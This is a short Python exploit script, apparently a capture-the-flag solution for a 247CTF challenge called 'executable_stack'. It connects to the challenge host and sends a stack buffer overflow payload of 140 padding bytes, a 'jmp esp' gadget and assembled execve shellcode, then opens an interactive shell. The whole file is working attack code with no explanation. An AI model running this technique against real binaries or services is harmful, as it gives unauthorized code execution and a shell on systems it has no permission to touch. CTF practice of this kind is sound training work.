#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from time import sleep

exe  = context.binary = ELF('./executable_stack')
host = args.HOST or '07f8f0e0385cddfe.247ctf.com'
port = int(args.PORT or 50249)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

libc=SetupLibcELF()
io = start()

re()
sl(b"A"*140 + gadget('jmp esp') + asm(execve_x32))

io.interactive()
